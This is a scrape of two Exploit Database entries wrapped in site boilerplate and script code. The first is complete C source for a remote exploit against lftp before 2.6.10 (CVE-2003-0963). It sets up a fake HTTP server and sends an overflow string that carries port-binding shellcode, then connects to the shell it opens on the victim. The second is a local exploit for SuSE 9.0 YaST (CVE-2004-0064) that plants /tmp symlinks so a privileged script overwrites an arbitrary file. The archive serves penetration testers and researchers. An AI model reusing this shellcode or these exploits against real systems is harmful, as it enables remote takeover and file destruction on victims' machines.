InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 143
lftp 2.6.9 - Remote Stack Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDlftp 2.6.9 - Remote Stack OverflowEDB-ID:143CVE:2003-0963EDB Verified:Author:Li0n7Type:remoteExploit:/Platform:LinuxDate:2004-01-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** lftp remote stack-based overflow exploit by Li0n7 voila fr** Vulnerability discovered by Ulf Harnhammar Ulf.Harnhammar.9485 student uu se** Lftp versions later than 2.6.10 are prone to a remotly exploitable stack-based* overflow in try_netscape_proxy() and try_squid_eplf( (src/HttpDir.cc). This* bad coded proof-of-concept demonstrates the exploitation by exploiting the* vulnerable function try_netscape_proxy() (HttpDir.cc:358) and it needs more targets* to be efficient. Please note that this vulnerability is really hard to exploit* since lots of parameters come into play and are different from a platform to another,* for we have to overwrite some variables and registers before overwriting eip.* With some time and lot of patience, you should find your own parameters by using* GDB. Params to edit are marked with a '!' in the POC code. Moreover, I have edited* Bighawk's port binding shellcode not to contain any white character such as \r,\t,\v,* \f,\n or \20 because we are exploiting a sscanf function.** usage: ./lftp-exp [-f <path>][-p <port>][-r <ret>][-t <target>]* -f <path>: create <path>index.html* -p <port>: run a fake lftp server on port <port> (default: 80)* -r <ret>: return address you would like to use* -t <target>: choose the target among the platforms available* Platforms supported are:* num: 0 - slack 9.0 - 0xbffff770** For instance: ./lftp-exp -p 80 -t 0* ./lftp-exp -f / -t 0** A poil !*/#include <stdio.h>#include <unistd.h>#include <netdb.h>#include <netinet/in.h>#include <errno.h>#include <fcntl.h>#include <unistd.h>#define BUFFERSIZE 117 /*!*/#define SIZE 256#define D_BACK 26112#define D_RET 0xbffff770#define D_PORT 80#define DUMMY1 0xbffff140 /*!*/#define DUMMY2 0xbffff810 /*!*/#define OK "cd ok, cwd=/\n"/* Edited bighawk 78 bytes portbinding shellcode *//* size: 80 bytes *//* Does not contain any white character i.e \r,\t,\v,\f,\n,\20 */char shellcode[] ="\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0""\x66\x52\x50\xcd\x80\x43\x66\x53\x89\xe1\x6a\x10""\x51\x50\x89\xe1\x52\x50\xb0\x66\xcd\x80\x89\xe1""\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x89""\xd9\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x6e""\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53""\x89\xe1\xb0\x28\x2c\x1d\xcd\x80";char badc0ded[] ={0x20,0x09,0x0a,0x0b,0x0c,0x0d,0x00};char *lftp_versions[] ={"lftp/2.3","lftp/2.4.9","lftp/2.5.2","lftp/2.6.0","lftp/2.6.3","lftp/2.6.4","lftp/2.6.5","lftp/2.6.6","lftp/2.6.7","lftp/2.6.8","lftp/2.6.9",};unsigned long ret_addr = D_RET;int back_connection(long host);int check_shellcode(char *host);void check_version();char * build(char *host);int create_file(char *path);void wait_connection(int port);long resolve_host(u_char *host_name);void die(char *argv);struct os_ret_addr{int num;char *plat;long ret;};struct os_ret_addr exp_os[]={{0,"slack 9.0",0xbffff770},{0,NULL,0}};intmain(int argc,char *argv[]){int i, option, port = D_PORT;long host = 0;char * option_list = "f:p:r:t:", path[128];opterr = 0;if (argc < 2) die(argv[0]);while((option = getopt(argc,argv,option_list)) != -1)switch(option){case 'f':strncpy(path,optarg,sizeof(path)-1);path[sizeof(path)-1] = '\0';create_file(path);return 0;case 'p':port = atoi(optarg);if(port > 65535 || port < 0) exit(-1);break;case 'r':ret_addr = atol(optarg);if(ret_addr > 0xbfffffff || ret_addr < 0x00000000) exit(1);break;case 't':for(i=0; exp_os[i].plat != NULL; i++)if(atoi(optarg) > i || atoi(optarg) < 0){fprintf(stderr," Platforms supported are:\n");for(i=0; exp_os[i].plat != NULL; i++)fprintf(stderr," num: %i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);exit(1);}ret_addr = exp_os[atoi(optarg)].ret;break;case '?':fprintf(stderr,"[-] option \'%c\' invalid\n",optopt);die(argv[0]);}wait_connection(port);return 0;}intcheck_shellcode(char *host){int i,j;for(i=0;i<strlen(shellcode);i++)for(j=0;j<strlen(badc0ded);j++)if(shellcode[i] == badc0ded[j]){fprintf(stderr,"[%s] badc0ded shellcode!\n",host);return -1;}return 0;}voidcheck_version(char *version){int i;for(i=0;i<sizeof(lftp_versions);i++)if(!strcmp(lftp_versions[i],version)){fprintf(stdout,"(vulnerable).\n");return;}fprintf(stdout,"(not vulnerable).\n");return;}char*build(char *host){char *buffer,*ptr;int i;unsigned long *addr_ptr;fprintf(stdout,"[%s] Building evil string to send (using ret 0x%x)...\n",host,ret_addr);buffer = (char *)malloc(SIZE+1);if(!buffer){fprintf(stderr,"[-] Can't allocate memory,exiting...\n");exit(1);}ptr = buffer;memset(ptr,0x90,BUFFERSIZE-strlen(shellcode));ptr += BUFFERSIZE-strlen(shellcode);if((i = check_shellcode(host)) < 0) exit(1);for(i=0;i<strlen(shellcode);i++)*ptr++ = shellcode[i];/* You might need to modify the padding too */addr_ptr = (long *)ptr;for(i=0;i<24;i++)*(addr_ptr++) = DUMMY1;for(i=0;i<8;i++)*(addr_ptr++) = DUMMY2;*(addr_ptr++) = ret_addr; /* EIP */*(addr_ptr++) = DUMMY2;ptr = (char *)addr_ptr;*ptr = 0x0;return buffer;}intcreate_file(char *path){int fd;char buffer[512], file[256];ssize_t written;memset(file,0,256);memset(buffer,0,512);strcat(file,path);strcat(file,"index.html");fd = open(file,O_WRONLY | O_CREAT | O_TRUNC,0644);if(fd < 0){fprintf(stderr,"[-] %s\n",strerror(errno));exit(0);}snprintf(buffer,512,"<a href=\"/\">empty</a> Fri May 30 10:09:06 2001 %s\n",build("+"));written = write(fd,buffer,512);if(written != 512){fprintf(stderr,"[-] %s\n",strerror(errno));exit(0);}close(fd);fprintf(stdout,"[+] File %s successfuly created.\n",file);return 0;}intback_connection(long host){struct sockaddr_in s;u_char sock_buf[4096];fd_set fds;int fd,size;char *command="/bin/uname -a ; /usr/bin/id;\n";fd = socket(AF_INET, SOCK_STREAM, 0);if (fd < 0){fprintf(stderr,"[-] %s\n",strerror(errno));exit(1);}s.sin_family = AF_INET;s.sin_port = htons(D_BACK);s.sin_addr.s_addr = host;if (connect(fd, (struct sockaddr *)&s, sizeof(struct sockaddr)) == -1){fprintf(stderr,"[-] %s\n",strerror(errno));close(fd);return 0;}fprintf(stdout, "[+] Let's rock on!\n");size = send(fd, command, strlen(command), 0);if(size < 0){fprintf(stderr,"[-] %s\n",strerror(errno));close(fd);exit(1);}for (;;){FD_ZERO(&fds);FD_SET(0, &fds);FD_SET(fd, &fds);if (select(255, &fds, NULL, NULL, NULL) == -1){fprintf(stderr,"[-] %s\n",strerror(errno));close(fd);exit(1);}memset(sock_buf, 0, sizeof(sock_buf));if (FD_ISSET(fd, &fds)){if (recv(fd, sock_buf, sizeof(sock_buf), 0) == -1){fprintf(stderr, "[-] Connection closed by remote host,exiting...\n");close(fd);exit(1);}fprintf(stderr, "%s", sock_buf);}if (FD_ISSET(0, &fds)){read(0, sock_buf, sizeof(sock_buf));write(fd, sock_buf, strlen(sock_buf));}}return 0;}voidwait_connection(int port){struct sockaddr_in s;int size, fd, fd2, i, r, cancel = 0;char data[1024], version[32], request[512];char *ptr;long host = 0;memset(data,0,1024);fprintf(stdout,"[+] Setting up a fake HTTP server...\n");fd = socket(AF_INET,SOCK_STREAM,0);if(fd < 0){fprintf(stderr,"[-] %s\n",strerror(errno));exit(1);}s.sin_family = AF_INET;s.sin_port = htons(port);s.sin_addr.s_addr = 0;bind(fd,(struct sockaddr *) &s,sizeof(s));listen(fd,1);size = sizeof(s);fprintf(stdout,"[+] Awaiting connection on port %i\n",port);while(1){cancel = 0;fd2 = accept(fd,(struct sockaddr *) &s, &size);if(!fork()){close(fd);while(1){memset(data,0,1024);r = read(fd2,data,1024);if((ptr = strstr(data,"User-Agent: lftp")) != NULL){if(strstr(data,"HEAD")){fprintf(stdout,"[%s] HEAD request received.\n",inet_ntoa(s.sin_addr));size = send(fd2, OK, strlen(OK), 0);if(size < 0){fprintf(stderr,"[-] %s\n",strerror(errno));close(fd2);exit(1);}}if(strstr(data,"GET")){memset(request,0,512);memset(version,0,32);strncpy(version,ptr+12,10);version[sizeof(version)-1] = '\0';fprintf(stdout,"[%s] GET request received.\n",inet_ntoa(s.sin_addr));fprintf(stdout,"[%s] Remote version of lftp: %s ",inet_ntoa(s.sin_addr),version);check_version(version);snprintf(request,512,"HTTP/1.1 200 OK\n""Server: thttpd/2.21 20apr2001\n""Content-Type: text/html\n""Date: Sun, 21 Dec 2003 16:29:44 GMT\n""Last-Modified: Sun, 21 Dec 2003 16:23:41 GMT\n""Accept-Ranges: bytes\n""Connection: close\n\n""<a href=\"/\">empty</a>\tFri May 30 10:09:06 2001 %s\n",build((char*)inet_ntoa(s.sin_addr)));size = send(fd2, request, strlen(request), 0);if(size < 0){fprintf(stderr,"[-] %s\n",strerror(errno));close(fd2);exit(1);}sleep(2);host = resolve_host((char *)inet_ntoa(s.sin_addr));back_connection(host);cancel = 1;break;}}}if(cancel == 1) break;}close(fd2);}return;}long resolve_host(u_char *host_name){struct in_addr addr;struct hostent *host_ent;addr.s_addr = inet_addr(host_name);if (addr.s_addr == -1){host_ent = gethostbyname(host_name);if (!host_ent) return(0);memcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);}return(addr.s_addr);}voiddie(char *argv){int i;fprintf(stdout,"\t Remote exploit for lftp < 2.6.10 by Li0n7 \n");fprintf(stdout,"\n usage: %s [-f <path>][-p <port>][-r <ret>][-t <target>]\n",argv);fprintf(stdout," -f <path>: create <path>index.html\n");fprintf(stdout," -p <port>: run a fake lftp server on port <port> (default: 80)\n");fprintf(stdout," -r <ret>: return address you would like to use\n");fprintf(stdout," -t <target>: choose the target among the platforms available\n");fprintf(stdout," Platforms supported are:\n");for(i=0; exp_os[i].plat != NULL; i++)fprintf(stderr," num: %i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);fprintf(stdout,"\n Vulnerability discovered by Ulf Harnhammar <Ulf.Harnhammar.9485@student.uu.se> \n");fprintf(stdout," Contact me: Li0n7@voila.fr\n\n");exit(1);}// milw0rm.com [2004-01-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 144
SuSE Linux 9.0 - YaST Configuration Skribt Overwrite Files - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSuSE Linux 9.0 - YaST Configuration Skribt Overwrite FilesEDB-ID:144CVE:2004-0064EDB Verified:Author:l0omType:localExploit:/Platform:LinuxDate:2004-01-15Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#include <stdio.h>#include <unistd.h>#include <string.h>#define PATH "/tmp/tmp.SuSEconfig.gnome-filesystem."#define START 1#define END 33000int main(int argc, char **argv){int i;char buf[150];printf("\tSuSE 9.0 YaST scriptSuSEconfig.gnome-filesystem exploit\n");printf("\t-------------------------------------------------------------\n");printf("\tdiscovered and written by l0om<l0om excluded org>\n");printf("\t WWW.EXCLUDED.ORG\n\n");if(argc != 2) {printf("usage: %s <destination-file>\n",argv[0]);exit(0xff);}printf("### hit enter to create or overwrite file %s: ",argv[1]); fflush(stdout);read(1, buf, 1); fflush(stdin);umask(0000);printf("working\n\n");for(i = START; i < END; i++) {snprintf(buf, sizeof(buf),"%s%d",PATH,i);if(mkdir(buf,00777) == -1) {fprintf(stderr, "cannot creat directory [Nr.%d]\n",i);exit(0xff);}if(!(i%1000))printf(".");strcat(buf, "/found");if(symlink(argv[1], buf) == -1) {fprintf(stderr, "cannot creat symlink from %s to %s[Nr.%d]\n",buf,argv[1],i);exit(0xff);}}printf("\ndone!\n");printf("next time the SuSE.gnome-filesystem scriptgets executed\n");printf("we will create or overwrite file %s\n",argv[1]);return(0x00);}  /* i cant wait for the new gobbles comic!! */// milw0rm.com [2004-01-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if 